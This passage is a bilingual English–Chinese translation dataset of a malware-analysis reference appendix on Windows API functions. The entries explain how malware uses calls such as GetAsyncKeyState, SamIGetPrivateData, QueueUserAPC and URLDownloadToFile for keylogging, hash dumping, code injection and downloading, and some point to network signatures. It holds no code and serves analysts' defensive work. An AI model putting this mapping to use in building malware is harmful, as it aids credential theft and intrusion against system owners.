- en: Used to determine whether a particular key is being pressed. Malware sometimes
    uses this function to implement a keylogger.
  id: totrans-283
  prefs: []
  type: TYPE_NORMAL
  zh: 用来确定是否按下了特定键。恶意软件有时使用此功能来实现键盘记录器。
- en: '**GetDC**'
  id: totrans-284
  prefs: []
  type: TYPE_NORMAL
  zh: '**GetDC**'
- en: Returns a handle to a device context for a window or the whole screen.
  id: totrans-285
  prefs: []
  type: TYPE_NORMAL
  zh: 返回一个窗口或整个屏幕设备上下文的句柄。
- en: Spyware that takes screen captures often uses this function.
  id: totrans-286
  prefs: []
  type: TYPE_NORMAL
  zh: 间谍软件截取屏幕时经常使用此功能。
- en: '**GetForegroundWindow**'
  id: totrans-287
  prefs: []
  type: TYPE_NORMAL
  zh: '**GetForegroundWindow**'
- en: Returns a handle to the window currently in the foreground of the desktop. Keyloggers
    commonly use this function to determine in which window the user is entering his
    keystrokes.
  id: totrans-288
  prefs: []
  type: TYPE_NORMAL
  zh: 返回当前桌面前台窗口的句柄。键盘记录器通常使用此功能来确定用户在哪个窗口输入按键。
- en: '**gethostbyname**'
  id: totrans-289
  prefs: []
  type: TYPE_NORMAL
  zh: '**gethostbyname**'
- en: Used to perform a DNS lookup on a particular hostname prior to making an IP
    connection to a remote host. Hostnames that serve as command-and-control servers
    often make good network-based signatures.
  id: totrans-290
  prefs: []
  type: TYPE_NORMAL
  zh: 用来在连接到远程主机之前对特定主机名进行DNS查找。作为命令和控制服务器的主机名通常作为基于网络的签名。
- en: '**gethostname**'
  id: totrans-291
  prefs: []
  type: TYPE_NORMAL
  zh: '**gethostname**'
- en: Retrieves the hostname of the computer. Backdoors sometimes use gethostname
    as part of a survey of the victim machine.
  id: totrans-292
  prefs: []
  type: TYPE_NORMAL
  zh: 获取计算机的主机名。后门有时将gethostname作为对受害机器进行调查的一部分。
- en: '**GetKeyState**'
  id: totrans-293
  prefs: []
  type: TYPE_NORMAL
  zh: '**GetKeyState**'
- en: Used by keyloggers to obtain the status of a particular key on the keyboard.
  id: totrans-294
  prefs: []
  type: TYPE_NORMAL
  zh: 被键盘记录器用来获取键盘上特定键的状态。
- en: '**GetModuleFilename**'
  id: totrans-295
  prefs: []
  type: TYPE_NORMAL
  zh: '**GetModuleFilename**'
- en: Returns the filename of a module that is loaded in the current process.
  id: totrans-296
  prefs: []
  type: TYPE_NORMAL
  zh: 返回当前进程中加载的模块的文件名。
- en: Malware can use this function to modify or copy files in the currently running
    process.
  id: totrans-297
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件可以使用此功能来修改或复制当前运行进程中的文件。
- en: '**GetModuleHandle**'
  id: totrans-298
  prefs: []
  type: TYPE_NORMAL
  zh: '**GetModuleHandle**'
- en: Used to obtain a handle to an already loaded module. Malware may use GetModuleHandle
    to locate and modify code in a loaded module or to search for a good location
    to inject code.
  id: totrans-299
  prefs: []
  type: TYPE_NORMAL
  zh: 用来获取已加载模块的句柄。恶意软件可能使用GetModuleHandle来定位和修改已加载模块中的代码，或寻找注入代码的好位置。
- en: '**GetProcAddress**'
  id: totrans-300
  prefs: []
  type: TYPE_NORMAL
  zh: '**GetProcAddress**'
- en: Retrieves the address of a function in a DLL loaded into memory. Used to import
    functions from other DLLs in addition to the functions imported in the PE file
    header.
  id: totrans-301
  prefs: []
  type: TYPE_NORMAL
  zh: 获取已加载到内存中的DLL中函数的地址。除了在PE文件头中导入的函数外，还用来从其他DLL中导入函数。
- en: '**GetStartupInfo**'
  id: totrans-302
  prefs: []
  type: TYPE_NORMAL
  zh: '**GetStartupInfo**'
- en: Retrieves a structure containing details about how the current process was configured
    to run, such as where the standard handles are directed.
  id: totrans-303
  prefs: []
  type: TYPE_NORMAL
  zh: 获取一个包含有关当前进程如何配置运行详情的结构，例如标准句柄的指向。
- en: '**GetSystemDefaultLangId**'
  id: totrans-304
  prefs: []
  type: TYPE_NORMAL
  zh: '**GetSystemDefaultLangId**'
- en: Returns the default language settings for the system. This can be used to customize
    displays and filenames, as part of a survey of an infected victim, or by “patriotic”
    malware that affects only systems from certain regions.
  id: totrans-305
  prefs: []
  type: TYPE_NORMAL
  zh: 返回系统的默认语言设置。这可以用于自定义显示和文件名，作为对受感染受害者的调查的一部分，或者由“爱国”恶意软件使用，仅影响来自某些地区的系统。
- en: '**GetTempPath**'
  id: totrans-306
  prefs: []
  type: TYPE_NORMAL
  zh: '**GetTempPath**'
- en: Returns the temporary file path. If you see malware call this function, check
    whether it reads or writes any files in the temporary file path.
  id: totrans-307
  prefs: []
  type: TYPE_NORMAL
  zh: 返回临时文件路径。如果您看到恶意软件调用此函数，请检查它是否在临时文件路径中读取或写入任何文件。
- en: Important Windows Functions
  id: totrans-308
  prefs: []
  type: TYPE_NORMAL
  zh: 重要Windows函数
- en: '**457**'
  id: totrans-309
  prefs: []
  type: TYPE_NORMAL
  zh: '**457**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-310
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**GetThreadContext**'
  id: totrans-311
  prefs: []
  type: TYPE_NORMAL
  zh: '**GetThreadContext**'
- en: Returns the context structure of a given thread. The context for a thread stores
    all the thread information, such as the register values and current state.
  id: totrans-312
  prefs: []
  type: TYPE_NORMAL
  zh: 返回给定线程的上下文结构。线程的上下文存储了所有线程信息，例如寄存器值和当前状态。
- en: '**GetTickCount**'
  id: totrans-313
  prefs: []
  type: TYPE_NORMAL
  zh: '**GetTickCount**'
- en: Retrieves the number of milliseconds since bootup. This function is sometimes
    used to gather timing information as an anti-debugging technique. GetTickCount
    is often added by the compiler and is included in many executables, so simply
    seeing it as an imported function provides little information.
  id: totrans-314
  prefs: []
  type: TYPE_NORMAL
  zh: 获取自启动以来的毫秒数。此函数有时用作反调试技术中的时间信息收集。GetTickCount 通常由编译器添加，并包含在许多可执行文件中，因此仅将其视为导入函数提供的信息很少。
- en: '**GetVersionEx**'
  id: totrans-315
  prefs: []
  type: TYPE_NORMAL
  zh: '**GetVersionEx**'
- en: Returns information about which version of Windows is currently running. This
    can be used as part of a victim survey or to select between different offsets
    for undocumented structures that have changed between different versions of Windows.
  id: totrans-316
  prefs: []
  type: TYPE_NORMAL
  zh: 返回当前正在运行的 Windows 版本信息。这可以用作受害者调查的一部分或用于选择在不同版本的 Windows 之间更改的不同偏移量的未记录结构。
- en: '**GetWindowsDirectory**'
  id: totrans-317
  prefs: []
  type: TYPE_NORMAL
  zh: '**GetWindowsDirectory**'
- en: Returns the file path to the Windows directory (usually *C:\Windows*).
  id: totrans-318
  prefs: []
  type: TYPE_NORMAL
  zh: 返回 Windows 目录的文件路径（通常是 *C:\Windows*）。
- en: Malware sometimes uses this call to determine into which directory to install
    additional malicious programs.
  id: totrans-319
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件有时使用此调用以确定安装附加恶意程序的目录。
- en: '**inet_addr**'
  id: totrans-320
  prefs: []
  type: TYPE_NORMAL
  zh: '**inet_addr**'
- en: Converts an IP address string like 127.0.0.1 so that it can be used by functions
    such as connect. The string specified can sometimes be used as a network-based
    signature.
  id: totrans-321
  prefs: []
  type: TYPE_NORMAL
  zh: 将 IP 地址字符串（如 127.0.0.1）转换为可以由 connect 等函数使用的格式。指定的字符串有时可以用作基于网络的签名。
- en: '**InternetOpen**'
  id: totrans-322
  prefs: []
  type: TYPE_NORMAL
  zh: '**InternetOpen**'
- en: Initializes the high-level Internet access functions from WinINet, such as InternetOpenUrl
    and InternetReadFile. Searching for InternetOpen is a good way to find the start
    of Internet access functionality. One of the parameters to InternetOpen is the
    User-Agent, which can sometimes make a good network-based signature.
  id: totrans-323
  prefs: []
  type: TYPE_NORMAL
  zh: 从 WinINet 初始化高级 Internet 访问功能，如 InternetOpenUrl 和 InternetReadFile。搜索 InternetOpen
    是找到 Internet 访问功能开始的好方法。InternetOpen 的一个参数是 User-Agent，有时可以作为一个好的基于网络的签名。
- en: '**InternetOpenUrl**'
  id: totrans-324
  prefs: []
  type: TYPE_NORMAL
  zh: '**InternetOpenUrl**'
- en: Opens a specific URL for a connection using FTP, HTTP, or HTTPS.
  id: totrans-325
  prefs: []
  type: TYPE_NORMAL
  zh: 使用 FTP、HTTP 或 HTTPS 打开特定 URL 以建立连接。
- en: URLs, if fixed, can often be good network-based signatures.
  id: totrans-326
  prefs: []
  type: TYPE_NORMAL
  zh: 如果 URL 是固定的，那么它们通常可以成为好的基于网络的签名。
- en: '**InternetReadFile**'
  id: totrans-327
  prefs: []
  type: TYPE_NORMAL
  zh: '**InternetReadFile**'
- en: Reads data from a previously opened URL.
  id: totrans-328
  prefs: []
  type: TYPE_NORMAL
  zh: 从先前打开的 URL 读取数据。
- en: '**InternetWriteFile**'
  id: totrans-329
  prefs: []
  type: TYPE_NORMAL
  zh: '**InternetWriteFile**'
- en: Writes data to a previously opened URL.
  id: totrans-330
  prefs: []
  type: TYPE_NORMAL
  zh: 将数据写入先前打开的 URL。
- en: '**IsDebuggerPresent**'
  id: totrans-331
  prefs: []
  type: TYPE_NORMAL
  zh: '**IsDebuggerPresent**'
- en: Checks to see if the current process is being debugged, often as part of an
    anti-debugging technique. This function is often added by the compiler and is
    included in many executables, so simply seeing it as an imported function provides
    little information.
  id: totrans-332
  prefs: []
  type: TYPE_NORMAL
  zh: 检查当前进程是否正在被调试，通常作为反调试技术的一部分。此函数通常由编译器添加，并包含在许多可执行文件中，因此仅将其视为导入函数提供的信息很少。
- en: '**IsNTAdmin**'
  id: totrans-333
  prefs: []
  type: TYPE_NORMAL
  zh: '**IsNTAdmin**'
- en: Checks if the user has administrator privileges.
  id: totrans-334
  prefs: []
  type: TYPE_NORMAL
  zh: 检查用户是否有管理员权限。
- en: '**458**'
  id: totrans-335
  prefs: []
  type: TYPE_NORMAL
  zh: '**458**'
- en: Appendix A
  id: totrans-336
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 A
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-337
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**IsWoW64Process**'
  id: totrans-338
  prefs: []
  type: TYPE_NORMAL
  zh: '**IsWoW64Process**'
- en: Used by a 32-bit process to determine if it is running on a 64-bit operating
    system.
  id: totrans-339
  prefs: []
  type: TYPE_NORMAL
  zh: 由 32 位进程使用，以确定它是否在 64 位操作系统上运行。
- en: '**LdrLoadDll**'
  id: totrans-340
  prefs: []
  type: TYPE_NORMAL
  zh: '**LdrLoadDll**'
- en: Low-level function to load a DLL into a process, just like LoadLibrary.
  id: totrans-341
  prefs: []
  type: TYPE_NORMAL
  zh: 与 LoadLibrary 类似，这是一个将 DLL 加载到进程中的低级函数。
- en: Normal programs use LoadLibrary, and the presence of this import may indicate
    a program that is attempting to be stealthy.
  id: totrans-342
  prefs: []
  type: TYPE_NORMAL
  zh: 正常程序使用 LoadLibrary，此导入的存在可能表明一个试图隐藏的程序。
- en: '**LoadLibrary**'
  id: totrans-343
  prefs: []
  type: TYPE_NORMAL
  zh: '**LoadLibrary**'
- en: Loads a DLL into a process that may not have been loaded when the program started.
    Imported by nearly every Win32 program.
  id: totrans-344
  prefs: []
  type: TYPE_NORMAL
  zh: 将 DLL 加载到程序启动时可能尚未加载的进程中。几乎所有 Win32 程序都会导入此函数。
- en: '**LoadResource**'
  id: totrans-345
  prefs: []
  type: TYPE_NORMAL
  zh: '**LoadResource**'
- en: Loads a resource from a PE file into memory. Malware sometimes uses resources
    to store strings, configuration information, or other malicious files.
  id: totrans-346
  prefs: []
  type: TYPE_NORMAL
  zh: 从 PE 文件中加载资源到内存中。恶意软件有时使用资源来存储字符串、配置信息或其他恶意文件。
- en: '**LsaEnumerateLogonSessions**'
  id: totrans-347
  prefs: []
  type: TYPE_NORMAL
  zh: '**LsaEnumerateLogonSessions**'
- en: Enumerates through logon sessions on the current system, which can be used as
    part of a credential stealer.
  id: totrans-348
  prefs: []
  type: TYPE_NORMAL
  zh: 在当前系统上枚举登录会话，这可以用作凭证窃取器的一部分。
- en: '**MapViewOfFile**'
  id: totrans-349
  prefs: []
  type: TYPE_NORMAL
  zh: '**MapViewOfFile**'
- en: Maps a file into memory and makes the contents of the file accessible via memory
    addresses. Launchers, loaders, and injectors use this function to read and modify
    PE files. By using MapViewOfFile, the malware can avoid using WriteFile to modify
    the contents of a file.
  id: totrans-350
  prefs: []
  type: TYPE_NORMAL
  zh: 将文件映射到内存中，并通过内存地址访问文件内容。启动器、加载器和注入器使用此功能来读取和修改 PE 文件。通过使用 MapViewOfFile，恶意软件可以避免使用
    WriteFile 来修改文件内容。
- en: '**MapVirtualKey**'
  id: totrans-351
  prefs: []
  type: TYPE_NORMAL
  zh: '**MapVirtualKey**'
- en: Translates a virtual-key code into a character value. It is often used by keylogging
    malware.
  id: totrans-352
  prefs: []
  type: TYPE_NORMAL
  zh: 将虚拟键码转换为字符值。它通常被键盘记录恶意软件使用。
- en: '**MmGetSystemRoutineAddress**'
  id: totrans-353
  prefs: []
  type: TYPE_NORMAL
  zh: '**MmGetSystemRoutineAddress**'
- en: Similar to GetProcAddress but used by kernel code. This function retrieves the
    address of a function from another module, but it can only get addresses from
    *ntoskrnl.exe* and *hal.dll*.
  id: totrans-354
  prefs: []
  type: TYPE_NORMAL
  zh: 与 GetProcAddress 类似，但由内核代码使用。此函数从另一个模块检索函数的地址，但它只能从 *ntoskrnl.exe* 和 *hal.dll*
    获取地址。
- en: '**Module32First/Module32Next**'
  id: totrans-355
  prefs: []
  type: TYPE_NORMAL
  zh: '**Module32First/Module32Next**'
- en: Used to enumerate through modules loaded into a process. Injectors use this
    function to determine where to inject code.
  id: totrans-356
  prefs: []
  type: TYPE_NORMAL
  zh: 用于枚举进程加载的模块。注入器使用此函数来确定注入代码的位置。
- en: '**NetScheduleJobAdd**'
  id: totrans-357
  prefs: []
  type: TYPE_NORMAL
  zh: '**NetScheduleJobAdd**'
- en: Submits a request for a program to be run at a specified date and time.
  id: totrans-358
  prefs: []
  type: TYPE_NORMAL
  zh: 提交一个请求，在指定的日期和时间运行程序。
- en: Malware can use NetScheduleJobAdd to run a different program. As a malware analyst,
    you’ll need to locate and analyze the program that will be run in the future.
  id: totrans-359
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件可以使用 NetScheduleJobAdd 来运行不同的程序。作为恶意软件分析师，您需要定位和分析将来将要运行的程序。
- en: '**NetShareEnum**'
  id: totrans-360
  prefs: []
  type: TYPE_NORMAL
  zh: '**NetShareEnum**'
- en: Used to enumerate network shares.
  id: totrans-361
  prefs: []
  type: TYPE_NORMAL
  zh: 用于枚举网络共享。
- en: '**NtQueryDirectoryFile**'
  id: totrans-362
  prefs: []
  type: TYPE_NORMAL
  zh: '**NtQueryDirectoryFile**'
- en: Returns information about files in a directory. Rootkits commonly hook this
    function in order to hide files.
  id: totrans-363
  prefs: []
  type: TYPE_NORMAL
  zh: 返回目录中文件的信息。Rootkits 通常挂钩此函数以隐藏文件。
- en: Important Windows Functions
  id: totrans-364
  prefs: []
  type: TYPE_NORMAL
  zh: 重要 Windows 函数
- en: '**459**'
  id: totrans-365
  prefs: []
  type: TYPE_NORMAL
  zh: '**459**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-366
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**NtQueryInformationProcess**'
  id: totrans-367
  prefs: []
  type: TYPE_NORMAL
  zh: '**NtQueryInformationProcess**'
- en: Returns various information about a specified process. This function is sometimes
    used as an anti-debugging technique because it can return the same information
    as CheckRemoteDebuggerPresent.
  id: totrans-368
  prefs: []
  type: TYPE_NORMAL
  zh: 返回有关指定进程的各种信息。此函数有时用作反调试技术，因为它可以返回与 CheckRemoteDebuggerPresent 相同的信息。
- en: '**NtSetInformationProcess**'
  id: totrans-369
  prefs: []
  type: TYPE_NORMAL
  zh: '**NtSetInformationProcess**'
- en: Can be used to change the privilege level of a program or to bypass Data Execution
    Prevention (DEP).
  id: totrans-370
  prefs: []
  type: TYPE_NORMAL
  zh: 可以用于更改程序的权限级别或绕过数据执行保护 (DEP)。
- en: '**OleInitialize**'
  id: totrans-371
  prefs: []
  type: TYPE_NORMAL
  zh: '**OleInitialize**'
- en: Used to initialize the COM library. Programs that use COM objects must call
    OleInitialize prior to calling any other COM functions.
  id: totrans-372
  prefs: []
  type: TYPE_NORMAL
  zh: 用于初始化 COM 库。使用 COM 对象的程序必须在调用任何其他 COM 函数之前调用 OleInitialize。
- en: '**OpenMutex**'
  id: totrans-373
  prefs: []
  type: TYPE_NORMAL
  zh: '**OpenMutex**'
- en: Opens a handle to a mutual exclusion object that can be used by malware to ensure
    that only a single instance of malware is running on a system at any given time.
    Malware often uses fixed names for mutexes, which can be good host-based indicators.
  id: totrans-374
  prefs: []
  type: TYPE_NORMAL
  zh: 打开一个互斥对象句柄，恶意软件可以使用它来确保在任何给定时间只有一个恶意软件实例在系统上运行。恶意软件通常使用固定的名称作为互斥锁，这可以是基于主机的良好指标。
- en: '**OpenProcess**'
  id: totrans-375
  prefs: []
  type: TYPE_NORMAL
  zh: '**OpenProcess**'
- en: Opens a handle to another process running on the system. This handle can be
    used to read and write to the other process memory or to inject code into the
    other process.
  id: totrans-376
  prefs: []
  type: TYPE_NORMAL
  zh: 打开系统上运行的另一个进程的句柄。此句柄可用于读取和写入其他进程的内存或将代码注入其他进程。
- en: '**OpenSCManager**'
  id: totrans-377
  prefs: []
  type: TYPE_NORMAL
  zh: '**OpenSCManager**'
- en: Opens a handle to the service control manager. Any program that installs, modifies,
    or controls a service must call this function before any other service-manipulation
    function.
  id: totrans-378
  prefs: []
  type: TYPE_NORMAL
  zh: 打开服务控制管理器的句柄。任何安装、修改或控制服务的程序必须在调用任何其他服务操作函数之前调用此函数。
- en: '**OutputDebugString**'
  id: totrans-379
  prefs: []
  type: TYPE_NORMAL
  zh: '**OutputDebugString**'
- en: Outputs a string to a debugger if one is attached. This can be used as an anti-debugging
    technique.
  id: totrans-380
  prefs: []
  type: TYPE_NORMAL
  zh: 如果附加了调试器，则将字符串输出到调试器。这可以用作反调试技术。
- en: '**PeekNamedPipe**'
  id: totrans-381
  prefs: []
  type: TYPE_NORMAL
  zh: '**PeekNamedPipe**'
- en: Used to copy data from a named pipe without removing data from the pipe. This
    function is popular with reverse shells.
  id: totrans-382
  prefs: []
  type: TYPE_NORMAL
  zh: 用于从命名管道复制数据而不从管道中删除数据。此功能在反向壳中很受欢迎。
- en: '**Process32First/Process32Next**'
  id: totrans-383
  prefs: []
  type: TYPE_NORMAL
  zh: '**Process32First/Process32Next**'
- en: Used to begin enumerating processes from a previous call to CreateToolhelp32Snapshot.
    Malware often enumerates through processes to find a process to inject into.
  id: totrans-384
  prefs: []
  type: TYPE_NORMAL
  zh: 用于从先前的 CreateToolhelp32Snapshot 调用开始枚举进程。恶意软件通常会枚举进程以找到要注入的进程。
- en: '**QueryPerformanceCounter**'
  id: totrans-385
  prefs: []
  type: TYPE_NORMAL
  zh: '**QueryPerformanceCounter**'
- en: Used to retrieve the value of the hardware-based performance counter.
  id: totrans-386
  prefs: []
  type: TYPE_NORMAL
  zh: 用于检索基于硬件的性能计数器的值。
- en: This function is sometimes using to gather timing information as part of an
    anti-debugging technique. It is often added by the compiler and is included in
    many executables, so simply seeing it as an imported function provides little
    information.
  id: totrans-387
  prefs: []
  type: TYPE_NORMAL
  zh: 此函数有时用作反调试技术的一部分来收集时间信息。它通常由编译器添加，并包含在许多可执行文件中，因此仅将其视为导入函数提供的信息很少。
- en: '**QueueUserAPC**'
  id: totrans-388
  prefs: []
  type: TYPE_NORMAL
  zh: '**QueueUserAPC**'
- en: Used to execute code for a different thread. Malware sometimes uses QueueUserAPC
    to inject code into another process.
  id: totrans-389
  prefs: []
  type: TYPE_NORMAL
  zh: 用于为不同的线程执行代码。恶意软件有时使用QueueUserAPC将代码注入另一个进程。
- en: '**ReadProcessMemory**'
  id: totrans-390
  prefs: []
  type: TYPE_NORMAL
  zh: '**ReadProcessMemory**'
- en: Used to read the memory of a remote process.
  id: totrans-391
  prefs: []
  type: TYPE_NORMAL
  zh: 用于读取远程进程的内存。
- en: '**460**'
  id: totrans-392
  prefs: []
  type: TYPE_NORMAL
  zh: '**460**'
- en: Appendix A
  id: totrans-393
  prefs: []
  type: TYPE_NORMAL
  zh: 附录A
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-394
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**recv**'
  id: totrans-395
  prefs: []
  type: TYPE_NORMAL
  zh: '**recv**'
- en: Receives data from a remote machine. Malware often uses this function to receive
    data from a remote command-and-control server.
  id: totrans-396
  prefs: []
  type: TYPE_NORMAL
  zh: 从远程机器接收数据。恶意软件通常使用此功能从远程命令和控制服务器接收数据。
- en: '**RegisterHotKey**'
  id: totrans-397
  prefs: []
  type: TYPE_NORMAL
  zh: '**RegisterHotKey**'
- en: Used to register a handler to be notified anytime a user enters a particular
    key combination (like CTRL-ALT-J), regardless of which window is active when the
    user presses the key combination. This function is sometimes used by spyware that
    remains hidden from the user until the key combination is pressed.
  id: totrans-398
  prefs: []
  type: TYPE_NORMAL
  zh: 用于注册一个处理程序，以便在用户按下特定键组合（如CTRL-ALT-J）时通知，无论用户按下键组合时哪个窗口是活动的。此功能有时被间谍软件使用，直到按下键组合，间谍软件才会对用户隐藏。
- en: '**RegOpenKey**'
  id: totrans-399
  prefs: []
  type: TYPE_NORMAL
  zh: '**RegOpenKey**'
- en: Opens a handle to a registry key for reading and editing. Registry keys are
    sometimes written as a way for software to achieve persistence on a host. The
    registry also contains a whole host of operating system and application setting
    information.
  id: totrans-400
  prefs: []
  type: TYPE_NORMAL
  zh: 打开一个注册表键的句柄以进行读取和编辑。注册表键有时被写入，作为软件在主机上实现持久性的方式。注册表还包含大量操作系统和应用程序设置信息。
- en: '**ResumeThread**'
  id: totrans-401
  prefs: []
  type: TYPE_NORMAL
  zh: '**ResumeThread**'
- en: Resumes a previously suspended thread. ResumeThread is used as part of several
    injection techniques.
  id: totrans-402
  prefs: []
  type: TYPE_NORMAL
  zh: 恢复之前挂起的线程。ResumeThread用作几种注入技术的一部分。
- en: '**RtlCreateRegistryKey**'
  id: totrans-403
  prefs: []
  type: TYPE_NORMAL
  zh: '**RtlCreateRegistryKey**'
- en: Used to create a registry from kernel-mode code.
  id: totrans-404
  prefs: []
  type: TYPE_NORMAL
  zh: 用于从内核模式代码创建注册表。
- en: '**RtlWriteRegistryValue**'
  id: totrans-405
  prefs: []
  type: TYPE_NORMAL
  zh: '**RtlWriteRegistryValue**'
- en: Used to write a value to the registry from kernel-mode code.
  id: totrans-406
  prefs: []
  type: TYPE_NORMAL
  zh: 用于从内核模式代码向注册表中写入值。
- en: '**SamIConnect**'
  id: totrans-407
  prefs: []
  type: TYPE_NORMAL
  zh: '**SamIConnect**'
- en: Connects to the Security Account Manager (SAM) in order to make future calls
    that access credential information. Hash-dumping programs access the SAM database
    in order to retrieve the hash of users’ login passwords.
  id: totrans-408
  prefs: []
  type: TYPE_NORMAL
  zh: 连接到安全账户管理器（SAM），以便进行访问凭证信息的后续调用。哈希转储程序访问SAM数据库以检索用户登录密码的哈希值。
- en: '**SamIGetPrivateData**'
  id: totrans-409
  prefs: []
  type: TYPE_NORMAL
  zh: '**SamIGetPrivateData**'
- en: Queries the private information about a specific user from the Security Account
    Manager (SAM) database. Hash-dumping programs access the SAM database in order
    to retrieve the hash of users’ login passwords.
  id: totrans-410
  prefs: []
  type: TYPE_NORMAL
  zh: 从安全账户管理器（SAM）数据库中查询特定用户的私有信息。哈希转储程序访问SAM数据库以检索用户登录密码的哈希值。
- en: '**SamQueryInformationUse**'
  id: totrans-411
  prefs: []
  type: TYPE_NORMAL
  zh: '**SamQueryInformationUse**'
- en: Queries information about a specific user in the Security Account Manager (SAM)
    database. Hash-dumping programs access the SAM database in order to retrieve the
    hash of users’ login passwords.
  id: totrans-412
  prefs: []
  type: TYPE_NORMAL
  zh: 查询安全账户管理器（SAM）数据库中特定用户的信息。哈希转储程序访问SAM数据库以检索用户登录密码的哈希值。
- en: '**send**'
  id: totrans-413
  prefs: []
  type: TYPE_NORMAL
  zh: '**send**'
- en: Sends data to a remote machine. Malware often uses this function to send data
    to a remote command-and-control server.
  id: totrans-414
  prefs: []
  type: TYPE_NORMAL
  zh: 向远程机器发送数据。恶意软件通常使用此功能将数据发送到远程命令和控制服务器。
- en: '**SetFileTime**'
  id: totrans-415
  prefs: []
  type: TYPE_NORMAL
  zh: '**SetFileTime**'
- en: Modifies the creation, access, or last modified time of a file. Malware often
    uses this function to conceal malicious activity.
  id: totrans-416
  prefs: []
  type: TYPE_NORMAL
  zh: 修改文件的创建、访问或最后修改时间。恶意软件通常使用此功能来隐藏恶意活动。
- en: '**SetThreadContext**'
  id: totrans-417
  prefs: []
  type: TYPE_NORMAL
  zh: '**SetThreadContext**'
- en: Used to modify the context of a given thread. Some injection techniques use
    SetThreadContext.
  id: totrans-418
  prefs: []
  type: TYPE_NORMAL
  zh: 用于修改给定线程的上下文。一些注入技术使用SetThreadContext。
- en: Important Windows Functions
  id: totrans-419
  prefs: []
  type: TYPE_NORMAL
  zh: 重要Windows函数
- en: '**461**'
  id: totrans-420
  prefs: []
  type: TYPE_NORMAL
  zh: '**461**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-421
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**SetWindowsHookEx**'
  id: totrans-422
  prefs: []
  type: TYPE_NORMAL
  zh: '**SetWindowsHookEx**'
- en: Sets a hook function to be called whenever a certain event is called.
  id: totrans-423
  prefs: []
  type: TYPE_NORMAL
  zh: 设置一个钩子函数，以便在调用特定事件时被调用。
- en: Commonly used with keyloggers and spyware, this function also provides an easy
    way to load a DLL into all GUI processes on the system. This function is sometimes
    added by the compiler.
  id: totrans-424
  prefs: []
  type: TYPE_NORMAL
  zh: 通常与键盘记录器和间谍软件一起使用，此功能还提供了一种简单的方法将DLL加载到系统上的所有GUI进程中。此功能有时由编译器添加。
- en: '**SfcTerminateWatcherThread**'
  id: totrans-425
  prefs: []
  type: TYPE_NORMAL
  zh: '**SfcTerminateWatcherThread**'
- en: Used to disable Windows file protection and modify files that otherwise would
    be protected. SfcFileException can also be used in this capacity.
  id: totrans-426
  prefs: []
  type: TYPE_NORMAL
  zh: 用于禁用Windows文件保护并修改其他情况下受保护的文件。SfcFileException也可以用于此目的。
- en: '**ShellExecute**'
  id: totrans-427
  prefs: []
  type: TYPE_NORMAL
  zh: '**ShellExecute**'
- en: Used to execute another program. If malware creates a new process, you will
    need to analyze the new process as well.
  id: totrans-428
  prefs: []
  type: TYPE_NORMAL
  zh: 用于执行另一个程序。如果恶意软件创建了一个新进程，您还需要分析该新进程。
- en: '**StartServiceCtrlDispatcher**'
  id: totrans-429
  prefs: []
  type: TYPE_NORMAL
  zh: '**StartServiceCtrlDispatcher**'
- en: Used by a service to connect the main thread of the process to the service control
    manager. Any process that runs as a service must call this function within 30
    seconds of startup. Locating this function in malware tells you that the function
    should be run as a service.
  id: totrans-430
  prefs: []
  type: TYPE_NORMAL
  zh: 服务用于将进程的主线程连接到服务控制管理器。任何以服务方式运行的进程必须在启动后30秒内调用此函数。在恶意软件中找到此函数表明该函数应以服务方式运行。
- en: '**SuspendThread**'
  id: totrans-431
  prefs: []
  type: TYPE_NORMAL
  zh: '**SuspendThread**'
- en: Suspends a thread so that it stops running. Malware will sometimes suspend a
    thread in order to modify it by performing code injection.
  id: totrans-432
  prefs: []
  type: TYPE_NORMAL
  zh: 暂停线程，使其停止运行。恶意软件有时会暂停线程，以便通过执行代码注入来修改它。
- en: '**system**'
  id: totrans-433
  prefs: []
  type: TYPE_NORMAL
  zh: '**system**'
- en: Function to run another program provided by some C runtime libraries.
  id: totrans-434
  prefs: []
  type: TYPE_NORMAL
  zh: 由某些C运行时库提供的运行另一个程序的函数。
- en: On Windows, this function serves as a wrapper function to CreateProcess.
  id: totrans-435
  prefs: []
  type: TYPE_NORMAL
  zh: 在Windows中，此函数作为CreateProcess的包装函数。
- en: '**Thread32First/Thread32Next**'
  id: totrans-436
  prefs: []
  type: TYPE_NORMAL
  zh: '**Thread32First/Thread32Next**'
- en: Used to iterate through the threads of a process. Injectors use these functions
    to find an appropriate thread to inject into.
  id: totrans-437
  prefs: []
  type: TYPE_NORMAL
  zh: 用于遍历进程的线程。注入器使用这些函数来找到要注入的适当线程。
- en: '**Toolhelp32ReadProcessMemory**'
  id: totrans-438
  prefs: []
  type: TYPE_NORMAL
  zh: '**Toolhelp32ReadProcessMemory**'
- en: Used to read the memory of a remote process.
  id: totrans-439
  prefs: []
  type: TYPE_NORMAL
  zh: 用于读取远程进程的内存。
- en: '**URLDownloadToFile**'
  id: totrans-440
  prefs: []
  type: TYPE_NORMAL
  zh: '**URLDownloadToFile**'
- en: A high-level call to download a file from a web server and save it to disk.
  id: totrans-441
  prefs: []
  type: TYPE_NORMAL
  zh: 从网络服务器下载文件并将其保存到磁盘的高级调用。
- en: This function is popular with downloaders because it implements all the functionality
    of a downloader in one function call.
  id: totrans-442
  prefs: []
  type: TYPE_NORMAL
  zh: 此函数在下载器中很受欢迎，因为它在一个函数调用中实现了下载器的所有功能。
- en: '**VirtualAllocEx**'
  id: totrans-443
  prefs: []
  type: TYPE_NORMAL
  zh: '**VirtualAllocEx**'
- en: A memory-allocation routine that can allocate memory in a remote process. Malware
